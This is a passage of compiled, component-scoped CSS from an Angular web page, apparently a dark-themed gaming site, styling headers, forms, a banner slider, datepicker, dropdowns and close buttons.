            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c9] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c9] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c9]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c9]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c9]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c9] span[_ngcontent-gtc-c9] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c9] h4[_ngcontent-gtc-c9] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9],
            .header-text-small[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c9] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c9] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c9] {
            float: left
        }

        .fright[_ngcontent-gtc-c9] {
            float: right
        }

        .row[_ngcontent-gtc-c9] .padding-left-0[_ngcontent-gtc-c9] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c9] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c9] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c9] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c9] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c9]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9]>.row[_ngcontent-gtc-c9] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9] .shuffle-pop-table[_ngcontent-gtc-c9] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9] .shuffle-pop-table[_ngcontent-gtc-c9] .shuffle-pop-item[_ngcontent-gtc-c9] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9] .shuffle-pop-table[_ngcontent-gtc-c9] .shuffle-pop-item.img[_ngcontent-gtc-c9] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9] img[_ngcontent-gtc-c9] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] strong[_ngcontent-gtc-c9] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c9] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c9] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c9]>.mat-calendar-body-cell-content[_ngcontent-gtc-c9]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c9],
        .mat-calendar-table-header[_ngcontent-gtc-c9] th[_ngcontent-gtc-c9],
        .mat-datepicker-content[_ngcontent-gtc-c9] .mat-calendar-next-button[_ngcontent-gtc-c9],
        .mat-datepicker-content[_ngcontent-gtc-c9] .mat-calendar-previous-button[_ngcontent-gtc-c9],
        .mat-datepicker-toggle[_ngcontent-gtc-c9],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c9] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c9] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c9] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c9] .mat-calendar-body-active[_ngcontent-gtc-c9]>.mat-calendar-body-cell-content[_ngcontent-gtc-c9]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c9] .mat-calendar-body-active[_ngcontent-gtc-c9]>.mat-calendar-body-cell-content[_ngcontent-gtc-c9]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c9]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c9]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c9]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c9] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c9] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c9] h3[_ngcontent-gtc-c9] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c9] {
                float: right
            }
            .fright[_ngcontent-gtc-c9] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c9] .shuffle-container[_ngcontent-gtc-c9] .shuffle-pop-table[_ngcontent-gtc-c9] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c9] button.mat-icon-button[_ngcontent-gtc-c9] {
                top: auto;
                bottom: 7px
            }
            [_nghost-gtc-c9] .dg-homeWrapper::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                bottom: 0;
                right: 0;
                width: 100%;
                background: linear-gradient(to bottom, #161619 40%, #161619 50%, #342441 100%)
            }
        }

        .mat-primary[_ngcontent-gtc-c9] .mat-option.mat-selected[_ngcontent-gtc-c9]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c9] .mat-option[_ngcontent-gtc-c9] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c9] div[_ngcontent-gtc-c9],
        .ngx-editor-textarea[_ngcontent-gtc-c9] section[_ngcontent-gtc-c9] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c9] div[_ngcontent-gtc-c9] img[_ngcontent-gtc-c9],
        .ngx-editor-textarea[_ngcontent-gtc-c9] section[_ngcontent-gtc-c9] img[_ngcontent-gtc-c9] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c9] a[_ngcontent-gtc-c9] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c9] *[_ngcontent-gtc-c9] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c9] b[_ngcontent-gtc-c9] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c9] b[_ngcontent-gtc-c9] *[_ngcontent-gtc-c9] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c9] td[_ngcontent-gtc-c9] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c9] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c9] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c9] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c9] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c9] img[_ngcontent-gtc-c9] {
            width: 50px;
            opacity: .5
        }

        [_nghost-gtc-c9] .pseudo-banner-background::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1446px;
            background: linear-gradient(to bottom, #161619 40%, #161619 50%, #342441 100%)
        }

        [_nghost-gtc-c9] .dg-homeWrapper {
            padding: 60px 0 0;
            position: relative;
            background-color: #161619;
            min-height: 500px
        }

        @media (max-width:991px) {
            [_nghost-gtc-c9] .dg-homeWrapper {
                padding: 85px 0 0;
                min-height: 664px
            }
        }

        [_nghost-gtc-c9] .dg-homeWrapper::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            width: 100%;
            background: linear-gradient(to bottom, #161619 40%, #161619 50%, #342441 100%)
        }

        [_nghost-gtc-c9] .dg-home-background {
            display: block;
            position: relative;
            background-repeat: no-repeat;
            background-position: top center;
            background-size: 100% auto;
            height: 620px
        }

        [_nghost-gtc-c9] .dg-home-background img {
            width: 100%;
            opacity: 1
        }

        [_nghost-gtc-c9] .dg-home-banner.show {
            display: block
        }

        [_nghost-gtc-c9] .dg-home-banner.hide {
            display: none
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-bg-slider {
            outline: 0;
            position: absolute;
            top: 0;
            right: 0;
            width: 85%;
            height: auto
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-bg-slider img {
            max-width: 100%
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-bg-slider::after {
            content: '';
            position: absolute;
            bottom: 0;
            height: 130px;
            left: 0;
            width: 100%;
            background: linear-gradient(180deg, rgba(224, 224, 224, 0) 0, #161617 86%, #161619 100%)
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider {
            outline: 0;
            height: -webkit-fit-content;
            height: -moz-fit-content;
            height: fit-content
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider.show {
            display: block
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider.hide {
            display: none
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-arrow {
            position: absolute;
            top: 35%;
            height: 83px;
            width: 28px;
            padding: 0;
            font-size: 0;
            background-color: rgba(22, 22, 25, .8);
            background-repeat: no-repeat;
            background-image: url(.assets/.images/.icons/right-arrow.png);
            background-size: 30%;
            background-position: center;
            border: 1px solid rgba(255, 255, 255, .3);
            border-radius: 4px;
            cursor: pointer;
            outline: 0
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-arrow.slick-prev {
            left: -64px;
            transform: rotate(180deg)
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-arrow.slick-next {
            right: -64px
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item {
            position: relative;
            width: 60%
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption {
            margin-bottom: 60px;
            width: 60%;
            padding: 60px 0 0
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption h2 {
            font-family: Montserrat-Bold;
            font-size: 48px;
            color: #fff;
            font-weight: 700;
            letter-spacing: normal;
            margin-bottom: 25px;
            line-height: 1.3;
            text-shadow: 2px 2px 10px #000
        }

        @media (max-width:767px) {
            [_nghost-gtc-c9] .dg-home-background {
                background-size: cover;
                height: 375px
            }
            [_nghost-gtc-c9] .dg-home-background img {
                display: none
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-bg-slider {
                width: 100%
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption {
                width: 100%;
                padding: 0;
                margin-bottom: 20px
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption h2 {
                margin-bottom: 20px;
                font-size: 30px;
                text-shadow: 2px 2px 4px #000
            }
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption p {
            font-family: Montserrat;
            font-size: 13.7px;
            color: #c9c9cd;
            line-height: 1.5;
            margin-bottom: 40px;
            text-align: left;
            text-shadow: 2px 2px #000
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption .cta {
            position: relative;
            width: 160px;
            height: 48px;
            display: inline-block;
            text-align: center;
            padding: 10px;
            margin-right: 30px;
            font-family: Montserrat;
            font-size: 1em;
            text-transform: uppercase;
            font-weight: 600;
            color: #fff;
            border-radius: 3px;
            text-decoration: none;
            letter-spacing: 1px;
            transition: all .3s ease-in-out
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption .cta.cta--transparent {
            background: 0 0;
            border: 1px solid #fff;
            width: auto;
            height: auto;
            padding: 13px 20px;
            font-size: 12px;
            margin-right: 0
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-dots {
            list-style-type: none;
            opacity: 1;
            bottom: 0;
            right: 0;
            position: absolute
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-dots li {
            float: left;
            margin-right: 10px;
            opacity: .5
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-dots li.slick-active {
            opacity: 1
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-dots li button {
            border: none;
            outline: 0;
            background: 0 0;
            padding: 0
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-dots li button .image-dot {
            width: 32px;
            height: 32px;
            border-radius: 4px;
            background-position: center;
            background-size: cover;
            border: 2px solid #fff
        }

        [_nghost-gtc-c9] .dg-home-banner .banner-slider .item-caption .header-text {
            opacity: 0
        }

        @media (max-width:767px) {
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption p {
                margin-bottom: 20px;
                text-shadow: 1px 1px #000
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .slider-item .item-caption .cta {
                width: 160px;
                height: 48px;
                margin-bottom: 20px;
                font-size: .8em;
                padding: 16px
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-dots li {
                margin-right: 5px
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-dots li:last-child {
                margin-right: -5px
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .slick-dots li button .image-dot {
                width: 24px;
                height: 24px
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .item-caption {
                position: relative
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .item-caption .header-text .cta {
                padding: 13px 15px
            }
            [_nghost-gtc-c9] .dg-home-banner .banner-slider .item-caption .header-text h2 {
                font-size: 24px
            }
        }

        [_nghost-gtc-c9] .dg-home-banner .latest-article {
            padding: 0;
            background: 0 0
        }

        [_nghost-gtc-c9] .shadow-center {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to right, #161619 0, rgba(24, 27, 30, 0) 40%, rgba(24, 27, 30, 0) 90%, #161619 100%)
        }

        [_nghost-gtc-c9] .custom-caption {
            position: absolute;
            top: 70px
        }
    </style>
    <style>
        .justify-content-left[_ngcontent-gtc-c10] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c10] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c10] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c10] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c10] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c10] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c10] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c10] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c10] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c10] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c10] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c10] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c10] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c10] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c10] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c10] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c10] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c10] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c10] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c10] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c10] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c10] button.mat-icon-button[_ngcontent-gtc-c10] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c10] button.mat-icon-button[_ngcontent-gtc-c10] span.mat-button-wrapper[_ngcontent-gtc-c10],
        .mat-datepicker-toggle[_ngcontent-gtc-c10] button.mat-icon-button[_ngcontent-gtc-c10] span.mat-button-wrapper[_ngcontent-gtc-c10] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c10] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c10] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c10] i.fa-caret-down[_ngcontent-gtc-c10] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c10] input[type=text][_ngcontent-gtc-c10] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option[_ngcontent-gtc-c10] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option.active[_ngcontent-gtc-c10] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option[_ngcontent-gtc-c10] ul.option-list[_ngcontent-gtc-c10] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option[_ngcontent-gtc-c10] ul.option-list[_ngcontent-gtc-c10] li[_ngcontent-gtc-c10] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option[_ngcontent-gtc-c10] ul.option-list[_ngcontent-gtc-c10] li[_ngcontent-gtc-c10] label[_ngcontent-gtc-c10] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option[_ngcontent-gtc-c10] ul.option-list[_ngcontent-gtc-c10] li[_ngcontent-gtc-c10] label[_ngcontent-gtc-c10]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option[_ngcontent-gtc-c10] ul.option-list[_ngcontent-gtc-c10] li[_ngcontent-gtc-c10] label[_ngcontent-gtc-c10]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option[_ngcontent-gtc-c10] ul.option-list[_ngcontent-gtc-c10] li[_ngcontent-gtc-c10] input[type=radio][_ngcontent-gtc-c10] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c10] .cust-option[_ngcontent-gtc-c10] ul.option-list[_ngcontent-gtc-c10] li[_ngcontent-gtc-c10] input[type=radio][_ngcontent-gtc-c10]:checked+label[_ngcontent-gtc-c10]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c10] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c10] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c10],
        label[_ngcontent-gtc-c10],
        ol[_ngcontent-gtc-c10] li[_ngcontent-gtc-c10],
        table[_ngcontent-gtc-c10] td[_ngcontent-gtc-c10],
        table[_ngcontent-gtc-c10] th[_ngcontent-gtc-c10],
        ul[_ngcontent-gtc-c10] li[_ngcontent-gtc-c10] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c10],
        h2[_ngcontent-gtc-c10],
        h3[_ngcontent-gtc-c10],
        h4[_ngcontent-gtc-c10],
        h5[_ngcontent-gtc-c10],
        h6[_ngcontent-gtc-c10],
        p[_ngcontent-gtc-c10],
        span[_ngcontent-gtc-c10] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c10] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c10],
        textarea[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c10] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c10] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c10] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c10] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c10] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c10] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c10] span[_ngcontent-gtc-c10] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c10] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c10] p.close-circle[_ngcontent-gtc-c10] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c10] p.close-circle[_ngcontent-gtc-c10] span[_ngcontent-gtc-c10] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c10] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c10] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c10] span[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c10] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c10] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c10] span[_ngcontent-gtc-c10] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c10] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c10] span[_ngcontent-gtc-c10] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

